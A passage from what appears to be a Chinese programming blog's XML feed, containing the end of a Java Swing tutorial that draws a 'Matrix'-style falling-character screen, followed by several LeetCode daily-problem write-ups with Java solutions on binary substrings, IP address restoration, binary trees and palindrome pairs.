&#125; private class GraphicsPanel extends JPanel &#123; @Override public void paint(Graphics g) &#123; // 设置背景黑色填充 g.setColor(Color.BLACK); g.fillRect(0, 0, screen.width, screen.height); &#125; &#125; public static void main(String[] args) &#123; new Rain(); &#125;&#125; 现在运行这个程序，不必奇怪，也不必害怕，我们会得到一个纯黑色的界面，我们可以通过按esc键退出程序，或者调出任务管理器杀掉该进程 准备工作做好了，现在我们来分析一下字符雨所具有的一些元素，很明显，我们需要在这个页面上画出一些随机字符，于是我们需要设置字符的大小，需要获取随机的字符，并且需要在页面上画出来，所以我们需要划分一下界面的行和列，基于以上分析，我们先画一个充满了随机字符的页面，于是我们将代码改进成这样： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100import javax.swing.*;import java.awt.*;import java.awt.event.KeyEvent;import java.awt.event.KeyListener;import java.awt.image.MemoryImageSource;import java.util.Random;public class Rain extends JFrame &#123; // 屏幕大小 private Dimension screen; // 画布容器 private JPanel graphicsPanel; // 字符大小 private int size = 16; // 划分屏幕区域，行数 private int rows; // 划分屏幕区域，列数 private int cols; // 随机 private Random random = new Random(); public Rain() &#123; // 获取屏幕大小 screen = getToolkit().getScreenSize(); // 设置去掉标题栏 setUndecorated(true); // 设置光标不可见 Toolkit defaultToolkit = Toolkit.getDefaultToolkit(); Image image = defaultToolkit.createImage(new MemoryImageSource(0, 0, null, 0, 0)); Cursor invisibleCursor = defaultToolkit.createCustomCursor(image, new Point(0, 0), "cursor"); setCursor(invisibleCursor); // 设置全屏 setSize(screen); // 设置按esc键退出 addKeyListener(new KeyListener() &#123; @Override public void keyTyped(KeyEvent e) &#123; &#125; @Override public void keyPressed(KeyEvent e) &#123; if (e.getKeyCode() == KeyEvent.VK_ESCAPE) &#123; System.exit(0); &#125; &#125; @Override public void keyReleased(KeyEvent e) &#123; &#125; &#125;); graphicsPanel = new GraphicsPanel(); // 设置面板 setContentPane(graphicsPanel); // 设置界面可显示 setVisible(true); // 设置行数和列数 rows = screen.width / size; cols = screen.height / size; &#125; /** * 获取随机ASCII可见字符 * * @return */ private char getRandomChar() &#123; return (char) (new Random().nextInt(94) + 33); &#125; /** * 画布容器 */ private class GraphicsPanel extends JPanel &#123; @Override public void paint(Graphics g) &#123; // 设置背景黑色填充 g.setColor(Color.BLACK); g.fillRect(0, 0, screen.width, screen.height); // 遍历划分的区域，将所有位置填满随机字符 for (int x = 0; x &lt; rows; x++) &#123; for (int y = 0; y &lt; cols; y++) &#123; // 设置随机字符的颜色和字体 g.setColor(Color.CYAN); g.setFont(new Font("黑体", Font.BOLD, size)); // 画 g.drawString(String.valueOf(getRandomChar()), x * size, y * size); &#125; &#125; &#125; &#125; public static void main(String[] args) &#123; new Rain(); &#125;&#125; 现在运行代码，你将会得到类似下面这样的界面，页面是静态的 现在我们来尝试让界面动起来，怎么做呢，很简单，我们可以开一个线程，专门去刷新页面，具体就是定时调用JPanel的repaint方法，于是代码进一步更改成这样了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129import javax.swing.*;import java.awt.*;import java.awt.event.KeyEvent;import java.awt.event.KeyListener;import java.awt.image.MemoryImageSource;import java.util.Random;public class Rain extends JFrame &#123; // 屏幕大小 private Dimension screen; // 画布容器 private JPanel graphicsPanel; // 字符大小 private int size = 16; // 划分屏幕区域，行数 private int rows; // 划分屏幕区域，列数 private int cols; // 随机 private Random random = new Random(); public Rain() &#123; // 获取屏幕大小 screen = getToolkit().getScreenSize(); // 设置去掉标题栏 setUndecorated(true); // 设置光标不可见 Toolkit defaultToolkit = Toolkit.getDefaultToolkit(); Image image = defaultToolkit.createImage(new MemoryImageSource(0, 0, null, 0, 0)); Cursor invisibleCursor = defaultToolkit.createCustomCursor(image, new Point(0, 0), "cursor"); setCursor(invisibleCursor); // 设置全屏 setSize(screen); // 设置按esc键退出 addKeyListener(new KeyListener() &#123; @Override public void keyTyped(KeyEvent e) &#123; &#125; @Override public void keyPressed(KeyEvent e) &#123; if (e.getKeyCode() == KeyEvent.VK_ESCAPE) &#123; System.exit(0); &#125; &#125; @Override public void keyReleased(KeyEvent e) &#123; &#125; &#125;); graphicsPanel = new GraphicsPanel(); // 设置面板 setContentPane(graphicsPanel); // 设置界面可显示 setVisible(true); // 设置行数和列数 rows = screen.width / size; cols = screen.height / size; // 开启定时刷新 new Refresher(100, graphicsPanel).start(); &#125; /** * 获取随机ASCII可见字符 * * @return */ private char getRandomChar() &#123; return (char) (new Random().nextInt(94) + 33); &#125; /** * 画布容器 */ private class GraphicsPanel extends JPanel &#123; @Override public void paint(Graphics g) &#123; // 设置背景黑色填充 g.setColor(Color.BLACK); g.fillRect(0, 0, screen.width, screen.height); // 遍历划分的区域，将所有位置填满随机字符 for (int x = 0; x &lt; rows; x++) &#123; for (int y = 0; y &lt; cols; y++) &#123; // 设置随机字符的颜色和字体 g.setColor(Color.CYAN); g.setFont(new Font("黑体", Font.BOLD, size)); // 画 g.drawString(String.valueOf(getRandomChar()), x * size, y * size); &#125; &#125; &#125; &#125; /** * 定时刷新画布容器 */ private class Refresher extends Thread &#123; private int sleep; private JPanel panel; public Refresher(int sleep, JPanel panel) &#123; this.sleep = sleep; this.panel = panel; &#125; @Override public void run() &#123; // 死循环固定休眠，即可达到定时刷新的效果 while (true) &#123; try &#123; panel.repaint(); Thread.sleep(sleep); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; public static void main(String[] args) &#123; new Rain(); &#125;&#125; 现在运行程序，可以明显看到页面动起来了 现在再来仔细分析一下，黑客帝国的代码雨，可以看到，雨滴是一列一列从屏幕最上面，慢慢的下落到最下面；雨滴的头是和雨滴的身体的颜色不一样；雨滴的长度不会很长；重复这个过程；基于这个过程，我们不难想到将代码改写如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171import wiki.zimo.helper.CharHelper;import javax.swing.*;import java.awt.*;import java.awt.event.KeyEvent;import java.awt.event.KeyListener;import java.awt.image.MemoryImageSource;import java.util.Random;public class Rain extends JFrame &#123; // 屏幕大小 private Dimension screen; // 画布容器 private JPanel graphicsPanel; // 字符大小 private int size = 16; // 划分屏幕区域，行数 private int rows; // 划分屏幕区域，列数 private int cols; // 随机 private Random random = new Random(); // 保存每列字符下落的坐标，雨滴的头的初始坐标——Y坐标 private int[] drops; // 雨滴的身体最大长度 private int maxLength = 30; // 一次下落的最大列数 private int maxDrop = 5; public Rain() &#123; // 获取屏幕大小 screen = getToolkit().getScreenSize(); // 设置去掉标题栏 setUndecorated(true); // 设置光标不可见 Toolkit defaultToolkit = Toolkit.getDefaultToolkit(); Image image = defaultToolkit.createImage(new MemoryImageSource(0, 0, null, 0, 0)); Cursor invisibleCursor = defaultToolkit.createCustomCursor(image, new Point(0, 0), "cursor"); setCursor(invisibleCursor); // 设置全屏 setSize(screen); // 设置按esc键退出 addKeyListener(new KeyListener() &#123; @Override public void keyTyped(KeyEvent e) &#123; &#125; @Override public void keyPressed(KeyEvent e) &#123; if (e.getKeyCode() == KeyEvent.VK_ESCAPE) &#123; System.exit(0); &#125; &#125; @Override public void keyReleased(KeyEvent e) &#123; &#125; &#125;); graphicsPanel = new GraphicsPanel(); // 设置面板 setContentPane(graphicsPanel); // 设置界面可显示 setVisible(true); // 设置行数和列数 rows = screen.width / size; cols = screen.height / size; drops = new int[rows]; // 随机drops for (int i = 0; i &lt; drops.length; i++) &#123; drops[i] = random.nextInt(cols); &#125; // 开启定时刷新 new Refresher(100, graphicsPanel).start(); &#125; /** * 获取随机ASCII可见字符 * * @return */ private char getRandomChar() &#123; return (char) (new Random().nextInt(94) + 33); &#125; /** * 画布容器 */ private class GraphicsPanel extends JPanel &#123; @Override public void paint(Graphics g) &#123; // 设置背景黑色填充 Font font = g.getFont(); g.setColor(Color.BLACK); g.fillRect(0, 0, screen.width, screen.height); // 按行遍历 for (int x = 0; x &lt; rows; x++) &#123; // 取出随机的y坐标 int y = drops[x]; // 画出雨滴的头 g.setColor(Color.CYAN); g.setFont(new Font("黑体", Font.BOLD, size)); g.drawString(String.valueOf(CharHelper.getRandomChar()), x * size, y * size); // 倒着往回画出雨滴的身体，颜色渐变 int color = 255; int len = 0; while (--y &gt; 0) &#123; len++; color -= 255 / y; if (color &lt; 0) &#123; color = 0; &#125; g.setFont(font); g.setColor(new Color(0, color, 0, color)); g.drawString(String.valueOf(CharHelper.getRandomChar()), x * size, y * size); if (len &gt;= maxLength) &#123; break; &#125; &#125; // 随机雨滴下落 drops[x] += random.nextInt(maxDrop); // 完全坠落 if (drops[x] &gt;= cols + maxLength) &#123; // 随机开始// drop[x] = random.nextInt(cols); // 从头开始 drops[x] = 0; &#125; &#125; &#125; &#125; /** * 定时刷新画布容器 */ private class Refresher extends Thread &#123; private int sleep; private JPanel panel; public Refresher(int sleep, JPanel panel) &#123; this.sleep = sleep; this.panel = panel; &#125; @Override public void run() &#123; // 死循环固定休眠，即可达到定时刷新的效果 while (true) &#123; try &#123; panel.repaint(); Thread.sleep(sleep); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; public static void main(String[] args) &#123; new Rain(); &#125;&#125; 最终效果]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>黑客帝国</tag>
        <tag>代码雨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/10]]></title>
    <url>%2Fposts%2F6d7d510a%2F</url>
    <content type="text"><![CDATA[题目：696. 计数二进制子串难度：简单 给定一个字符串 s，计算具有相同数量0和1的非空(连续)子字符串的数量，并且这些子字符串中的所有0和所有1都是组合在一起的。 重复出现的子串要计算它们出现的次数。 示例 1 : 1234567输入: &quot;00110011&quot;输出: 6解释: 有6个子串具有相同数量的连续1和0：“0011”，“01”，“1100”，“10”，“0011” 和 “01”。请注意，一些重复出现的子串要计算它们出现的次数。另外，“00110011”不是有效的子串，因为所有的0（和1）没有组合在一起。 示例 2 : 123输入: &quot;10101&quot;输出: 4解释: 有4个子串：“10”，“01”，“10”，“01”，它们具有相同数量的连续1和0。 注意： s.length 在1到50,000之间。 s 只包含“0”或“1”字符。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/count-binary-substrings著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 首先，我们来观察一个现象： “01”能构成几个满足题意的字串？答案是1，只能是：01 “001”能构成几个满足题意的字串？答案是1，只能是：01 “010”能构成几个满足题意的字串？答案是2，分别是：01，10 “0100”能构成几个满足题意的字串？答案是2，分别是：01，10 “0101”能构成几个满足题意的字串？答案是3，分别是：01，10，01 “0011”能构成几个满足题意的字串？答案是2，分别是：0011，01有什么规律呢？直接看好像不太明显但是如果我们用一个列表来记录，上面的字符串中依次连续出现的0和1的数目，然后再对以上数据进行归纳，会发现 “01”得到的列表是[1,1]，符合题意的字串数目是min(1,1)=1 “001”得到的列表是[2,1]，符合题意的字串数目是min(2,1)=1 “010”得到的列表是[1,1,1]，符合题意的字串数目是min(1,1)+min(1,1)=2 “0100”得到的列表是[1,1,2]，符合题意的字串数目是min(1,1)+min(1,2)=2 “0101”得到的列表是[1,1,1,1]，符合题意的字串数目是min(1,1)+min(1,1)+min(1,1)=3 “0011”得到的列表是[2,2]，符合题意的字串数目是min(2,2)=2得到了这个规律之后，思路就清晰了，首先用一个列表记录连续的0和1出现的数目，然后遍历列表，两两取小，最后相加即可得到答案 解题代码12345678910111213141516171819202122232425262728class Solution &#123; public int countBinarySubstrings(String s) &#123; int ans = 0; // 记录串中连续的0和1出现的数目 List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); int cnt = 1; for (int i = 0;i + 1 &lt; s.length();i++) &#123; char a = s.charAt(i); char b = s.charAt(i + 1); if (a == b) &#123; cnt++; &#125; else &#123; list.add(cnt); cnt = 1; &#125; &#125; // 不要遗漏最后一个 list.add(cnt); // 两两取小相加 for (int i = 0;i + 1&lt; list.size();i++) &#123; ans += Math.min(list.get(i),list.get(i + 1)); &#125; return ans; &#125;&#125; 附上暴力取子串校验是否满足条件解法，超时 123456789101112131415161718192021222324252627282930313233343536373839404142class Solution &#123; public int countBinarySubstrings(String s) &#123; int ans = 0; for (int i = 0;i &lt; s.length();i++) &#123; for (int j = s.length();j &gt; i;j--) &#123; if (judge(s.substring(i,j))) &#123; // System.out.println(s.substring(i,j)); ans++; &#125; &#125; &#125; return ans; &#125; private boolean judge(String s) &#123; // 字符串长度为奇数，不可能出现连续的0和1的数目相同 if (s.length() % 2 == 1) &#123; return false; &#125; // 字符串长度为偶数，保证两两成对的字符不相同，并且连续 // 标记最前面和最后面出现的字符 char first = s.charAt(0); char last = s.charAt(s.length() - 1); // 遍历一半，a，b两两成对 for (int i = 0;i &lt; s.length() / 2;i++) &#123; char a = s.charAt(i); char b = s.charAt(s.length() - 1 - i); // 如果两两成对的字符相同，或者遍历到中间出现了，不等于首尾标记的字符，代表不满足条件 if (a == b || a != first || b != last) &#123; return false; &#125; &#125; return true; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/9]]></title>
    <url>%2Fposts%2Fa1041931%2F</url>
    <content type="text"><![CDATA[题目：93. 复原IP地址难度：中等 给定一个只包含数字的字符串，复原它并返回所有可能的 IP 地址格式。 有效的 IP 地址正好由四个整数（每个整数位于 0 到 255 之间组成），整数之间用 ‘.’ 分隔。 示例: 12输入: &quot;25525511135&quot;输出: [&quot;255.255.11.135&quot;, &quot;255.255.111.35&quot;] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/restore-ip-addresses著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 ip地址的限制条件有： 必须有四段 每段1 ~ 3个数字 数字的范围在0 ~ 255 除0外，数字不能以0开头 必须使用完 所有给定的字符串基于这些限制，很容易想到使用回溯法去枚举所有情况，将满足这些条件的四段数字组合加入解集即可 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162class Solution &#123; public List&lt;String&gt; restoreIpAddresses(String s) &#123; if (s == null || s.length() &lt; 4 || s.length() &gt; 12) &#123; return ans; &#125; dfs(s, "", 0, 1); return ans; &#125; List&lt;String&gt; ans = new ArrayList&lt;&gt;(); // 这里并没有回溯，因为我把需要回溯的变量，设置在了参数t上 private void dfs(String s, String t, int c, int n) &#123; // c代表当前枚举位置，超过原始字符串 无意义 所以剪枝操作 if (c &gt;= s.length()) &#123; return; &#125; // n代表当前考虑的第几段ip，超过四段 无意义 剪枝 if (n &gt;= 4) &#123; // 枚举只会枚举前三段ip，第四段需要单独拼接 // 最后一段的长度不在1~3之间，剪枝 if (s.length() - c &gt; 3 || s.length() - c &lt; 1) &#123; return; &#125; // 最后一段ip以0开头，剪枝 if (s.charAt(c) == '0' &amp;&amp; c != s.length() - 1) &#123; return; &#125; // 满足条件，加入解集 int ip = Integer.valueOf(s.substring(c)); if (ip &gt;= 0 &amp;&amp; ip &lt;= 255) &#123; t += ip; // System.out.println(t); ans.add(t); &#125; return; &#125; // 如果字符串长度只有4或者当前考虑的位置是0字符的话 if (s.length() == 4 || s.charAt(c) == '0') &#123; // 只能选当前字符，然后进入下一轮考虑 dfs(s, t + s.charAt(c) + (n &lt;= 4 ? "." : ""), c + 1, n + 1); &#125; else &#123; // 否则尝试枚举从当前考虑位置开始的1~3位数字是否满足条件 for (int i = 3; i &gt;= 1; i--) &#123; if (c + i &gt; s.length()) &#123; continue; &#125; int ip = Integer.valueOf(s.substring(c, c + i)); if (ip &lt; 0 || ip &gt; 255) &#123; continue; &#125; dfs(s, t + ip + (n &lt;= 4 ? "." : ""), c + i, n + 1); &#125; &#125; &#125;&#125; 同样附上最为容易想到的暴力解法 12345678910111213141516171819202122232425262728293031323334353637383940414243class Solution &#123; public List&lt;String&gt; restoreIpAddresses(String s) &#123; List&lt;String&gt; ans = new ArrayList&lt;&gt;(); for (int a = 1; a &lt; 4; a++) &#123; for (int b = 1; b &lt; 4; b++) &#123; for (int c = 1; c &lt; 4; c++) &#123; if (a + b + c &lt; s.length()) &#123; String s1 = s.substring(0, a); if (!judge(s1)) continue; String s2 = s.substring(a, a + b); if (!judge(s2)) continue; String s3 = s.substring(a + b, a + b + c); if (!judge(s3)) continue; String s4 = s.substring(a + b + c); if (!judge(s4)) continue; ans.add(String.format("%s.%s.%s.%s",s1,s2,s3,s4)); &#125; &#125; &#125; &#125; return ans; &#125; private boolean judge(String s) &#123; if (s.length() &lt; 1 || s.length() &gt; 3) &#123; return false; &#125; if (s.charAt(0) == '0' &amp;&amp; s.length() &gt; 1) &#123; return false; &#125; int ip = Integer.valueOf(s); if (ip &lt; 0 || ip &gt; 255) &#123; return false; &#125; return true; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>回溯算法</tag>
        <tag>字符串</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/8]]></title>
    <url>%2Fposts%2Fd60329a7%2F</url>
    <content type="text"><![CDATA[题目：99. 恢复二叉搜索树难度：困难 二叉搜索树中的两个节点被错误地交换。 请在不改变其结构的情况下，恢复这棵树。 示例 1: 123456789101112131415输入: [1,3,null,null,2] 1 / 3 \ 2输出: [3,1,null,null,2] 3 / 1 \ 2 示例 2: 123456789101112131415输入: [3,1,4,null,null,2] 3 / \1 4 / 2输出: [2,1,4,null,null,3] 2 / \1 4 / 3 进阶: 使用 O(n) 空间复杂度的解法很容易实现。 你能想出一个只使用常数空间的解决方案吗？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/recover-binary-search-tree著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 二叉搜索树的性质是中序遍历后得到的序列一定是一个有序序列（升序），基于此，我们可以进行一次中序遍历找到不满足升序的两个节点，然后交换这两个节点的值即可 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode() &#123;&#125; * TreeNode(int val) &#123; this.val = val; &#125; * TreeNode(int val, TreeNode left, TreeNode right) &#123; * this.val = val; * this.left = left; * this.right = right; * &#125; * &#125; */class Solution &#123; public void recoverTree(TreeNode root) &#123; // 先进行中序遍历 ergodic(root); // 然后交换两个不满足升序的节点的值 int temp = n1.val; n1.val = n2.val; n2.val = temp; &#125; // 记录不满足升序的两个节点和上一次访问的节点 TreeNode n1,n2,pre; private void ergodic(TreeNode root) &#123; if (root == null) &#123; return; &#125; ergodic(root.left); // 找到不满足升序的两个节点，使用n1和n2记录下来 if (pre != null &amp;&amp; pre.val &gt; root.val) &#123; if (n1 == null) n1 = pre; n2 = root; &#125; pre = root; ergodic(root.right); &#125;&#125; 附上使用一个辅助的list记录中序遍历序列的解法，该解法需要进行两次中序遍历 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode() &#123;&#125; * TreeNode(int val) &#123; this.val = val; &#125; * TreeNode(int val, TreeNode left, TreeNode right) &#123; * this.val = val; * this.left = left; * this.right = right; * &#125; * &#125; */class Solution &#123; public void recoverTree(TreeNode root) &#123; // 第一次中序遍历 ergodic(root); // 排序 Collections.sort(list); // 第二次中序遍历 exchange(root); &#125; // 辅助记录中序遍历序列的list List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); int index = 0; // 第二次中序遍历，更正二叉搜索树的节点 private void exchange(TreeNode root) &#123; if (root == null) &#123; return; &#125; exchange(root.left); if (root.val != list.get(index)) &#123; root.val = list.get(index); &#125; index++; exchange(root.right); &#125; // 第一次中序遍历，记录升序序列 private void ergodic(TreeNode root) &#123; if (root == null) &#123; return; &#125; ergodic(root.left); list.add(root.val); ergodic(root.right); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>二叉搜索树</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/7]]></title>
    <url>%2Fposts%2F46bc3436%2F</url>
    <content type="text"><![CDATA[题目：100. 相同的树难度：简单 给定两个二叉树，编写一个函数来检验它们是否相同。 如果两个树在结构上相同，并且节点具有相同的值，则认为它们是相同的。 示例 1: 1234567输入: 1 1 / \ / \ 2 3 2 3 [1,2,3], [1,2,3]输出: true 示例 2: 1234567输入: 1 1 / \ 2 2 [1,2], [1,null,2]输出: false 示例 3: 1234567输入: 1 1 / \ / \ 2 1 1 2 [1,2,1], [1,1,2]输出: false 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/same-tree著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 直接递归比较两棵二叉树的每个节点是否相同即可，注意边界 解题代码1234567891011121314151617181920212223242526272829303132/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode() &#123;&#125; * TreeNode(int val) &#123; this.val = val; &#125; * TreeNode(int val, TreeNode left, TreeNode right) &#123; * this.val = val; * this.left = left; * this.right = right; * &#125; * &#125; */class Solution &#123; public boolean isSameTree(TreeNode p, TreeNode q) &#123; if (p == null &amp;&amp; q == null) &#123; return true; &#125; if ((p != null &amp;&amp; q == null) || (p == null &amp;&amp; q != null)) &#123; return false; &#125; if (p.val == q.val) &#123; return isSameTree(p.left,q.left) &amp;&amp; isSameTree(p.right,q.right); &#125; else &#123; return false; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>二叉树</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/6]]></title>
    <url>%2Fposts%2F31bb04a0%2F</url>
    <content type="text"><![CDATA[题目：336. 回文对难度：困难 给定一组 互不相同 的单词， 找出所有不同 的索引对(i, j)，使得列表中的两个单词， words[i] + words[j] ，可拼接成回文串。 示例 1： 123输入：[&quot;abcd&quot;,&quot;dcba&quot;,&quot;lls&quot;,&quot;s&quot;,&quot;sssll&quot;]输出：[[0,1],[1,0],[3,2],[2,4]] 解释：可拼接成的回文串为 [&quot;dcbaabcd&quot;,&quot;abcddcba&quot;,&quot;slls&quot;,&quot;llssssll&quot;] 示例 2： 123输入：[&quot;bat&quot;,&quot;tab&quot;,&quot;cat&quot;]输出：[[0,1],[1,0]] 解释：可拼接成的回文串为 [&quot;battab&quot;,&quot;tabbat&quot;] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/palindrome-pairs著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 借助HashMap保存状态共有三种情况 1. map中 天然的回文串 可以和 空串 组合出两对回文对 2. map中 原始字符串 和 翻转后的字符串 可以组合出一对回文对 3. 分割前缀和后缀 3.1 前缀是一个 回文串 并且map中存在 后缀翻转后的字符串 可以组合出一对回文对 3.2 后缀是一个 回文串 并且map中存在 前缀翻转后的字符串 可以组合出一对回文对 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; palindromePairs(String[] words) &#123; List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); Map&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0;i &lt; words.length;i++) &#123; map.put(words[i],i); &#125; for (int i = 0;i &lt; words.length;i++) &#123; String word = words[i]; // 1. 回文串可以和空串组合出两对回文对 if (!word.equals("") &amp;&amp; isPalindrome(word) &amp;&amp; map.containsKey("")) &#123; List&lt;Integer&gt; one = new ArrayList&lt;&gt;(); one.add(i); one.add(map.get("")); ans.add(one); one = new ArrayList&lt;&gt;(); one.add(map.get("")); one.add(i); ans.add(one); &#125; // 2. 原始字符串和翻转后的字符串可以组合出一对回文对 String reverse = new StringBuilder(word).reverse().toString(); if (!word.equals(reverse) &amp;&amp; map.containsKey(reverse)) &#123; List&lt;Integer&gt; one = new ArrayList&lt;&gt;(); one.add(i); one.add(map.get(reverse)); ans.add(one); &#125; // 3. 分割前缀和后缀 for (int j = 1;j &lt; word.length();j++) &#123; String prefix = word.substring(0,j); String sufix = word.substring(j); String rPrefix = new StringBuilder(prefix).reverse().toString(); String rSufix = new StringBuilder(sufix).reverse().toString(); // 3.1 前缀是一个回文串并且map中存在后缀翻转后的字符串 可以组合出一对回文对 if (isPalindrome(prefix) &amp;&amp; map.containsKey(rSufix)) &#123; int index = map.get(rSufix); if (i != index) &#123; List&lt;Integer&gt; one = new ArrayList(); one.add(index); one.add(i); ans.add(one); &#125; &#125; // 3.2 后缀是一个回文串并且map中存在前缀翻转后的字符串 可以组合出一对回文对 if (isPalindrome(sufix) &amp;&amp; map.containsKey(rPrefix)) &#123; int index = map.get(rPrefix); if (i != index) &#123; List&lt;Integer&gt; one = new ArrayList(); one.add(i); one.add(index); ans.add(one); &#125; &#125; &#125; &#125; return ans; &#125; private boolean isPalindrome(String s) &#123; for (int i = 0;i &lt; s.length() / 2;i++) &#123; if (s.charAt(i) != s.charAt(s.length() - 1 - i)) &#123; return false; &#125; &#125; return true; &#125;&#125; 附上最无脑的暴力解法：很遗憾在最后一个测试用例那里超时了 123456789101112131415161718192021222324252627282930313233class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; palindromePairs(String[] words) &#123; List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); for (int i = 0;i &lt; words.length;i++) &#123; String a = words[i]; for (int j = i + 1;j &lt; words.length;j++) &#123; String b = words[j]; if (isPalindrome(a + b)) &#123; List&lt;Integer&gt; one = new ArrayList&lt;&gt;(); one.add(i); one.add(j); ans.add(one); &#125; if (isPalindrome(b + a)) &#123; List&lt;Integer&gt; one = new ArrayList&lt;&gt;(); one.add(j); one.add(i); ans.add(one); &#125; &#125; &#125; return ans; &#125; private boolean isPalindrome(String s) &#123; for (int i = 0;i &lt; s.length() / 2;i++) &#123; if (s.charAt(i) != s.charAt(s.length() - 1 - i)) &#123; return false; &#125; &#125; return true; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/5]]></title>
    <url>%2Fposts%2Fa8b2551a%2F</url>
    <content type="text"><![CDATA[题目：337. 打家劫舍 III难度：中等 在上次打劫完一条街道之后和一圈房屋后，小偷又发现了一个新的可行窃的地区。这个地区只有一个入口，我们称之为“根”。 除了“根”之外，每栋房子有且只有一个“父“房子与之相连。一番侦察之后，聪明的小偷意识到“这个地方的所有房屋的排列类似于一棵二叉树”。 如果两个直接相连的房子在同一天晚上被打劫，房屋将自动报警。 计算在不触动警报的情况下，小偷一晚能够盗取的最高金额。 示例 1: 12345678910输入: [3,2,3,null,3,null,1] 3 / \ 2 3 \ \ 3 1输出: 7 解释: 小偷一晚能够盗取的最高金额 = 3 + 3 + 1 = 7. 示例 2: 12345678910输入: [3,4,5,1,3,null,1] 3 / \ 4 5 / \ \ 1 3 1输出: 9解释: 小偷一晚能够盗取的最高金额 = 4 + 5 = 9. 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/house-robber-iii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 天然的递归问题，小偷只有两种方案： 偷根结点和根结点的下两层的节点； 不偷根结点，偷根结点的左右子树结点； 重复这个过程比较这两种方案的优劣，返回大者 解题代码1234567891011121314151617181920212223242526272829303132333435/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public int rob(TreeNode root) &#123; return tryRob(root); &#125; private int tryRob(TreeNode root) &#123; if (root == null) &#123; return 0; &#125; // 偷根节点和下两层的节点 int c = root.val; if (root.left != null) &#123; c += tryRob(root.left.left); c += tryRob(root.left.right); &#125; if (root.right != null) &#123; c += tryRob(root.right.left); c += tryRob(root.right.right); &#125; // 不偷根结点，偷根结点的左右子树 int b = tryRob(root.left) + tryRob(root.right); return Math.max(c,b); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>二叉树</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/4]]></title>
    <url>%2Fposts%2Fdfb5658c%2F</url>
